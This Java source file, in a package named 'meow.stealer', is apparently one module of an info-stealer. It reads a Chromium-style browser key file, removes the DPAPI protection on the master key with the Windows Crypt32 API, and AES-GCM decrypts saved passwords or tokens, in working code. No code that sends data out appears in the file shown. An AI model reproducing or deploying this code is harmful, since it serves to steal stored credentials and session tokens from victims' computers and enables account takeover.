package meow.stealer;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.List;

import com.sun.jna.platform.win32.Crypt32Util;
import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;


public class Decryption {
    public static String decrypt(String key, byte[] token) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        JsonParser parser = new JsonParser();
        JsonObject jsonObject = parser.parse(key).getAsJsonObject();

        String mKey = jsonObject.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString();
        byte[] masterKey = Base64.getDecoder().decode(mKey);
        byte[] masterKey2 = new byte[masterKey.length - 5];
        System.arraycopy(masterKey, 5, masterKey2, 0, masterKey2.length);
        byte[] masterKey3 = Crypt32Util.cryptUnprotectData(masterKey2);
        return AESDecrypt(token, masterKey3);
    }

    public static void convertByteToHexadecimal(byte[] byteArray) {
        String hex = "";

        // Iterating through each byte in the array
        for (byte i : byteArray) {
            hex += String.format("%02X", i);
        }

        System.out.print(hex);
    }

    public static String AESDecrypt(byte[] buff, byte[] key) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        /* python to java
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
         */

        byte[] iv = new byte[12];
        System.arraycopy(buff, 3, iv, 0, 12);
        byte[] payload = new byte[buff.length - 15];
        System.arraycopy(buff, 15, payload, 0, payload.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, iv);
        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, gcmParameterSpec);
        byte[] decrypted = cipher.doFinal(payload);
        return new String(decrypted);
    }
}

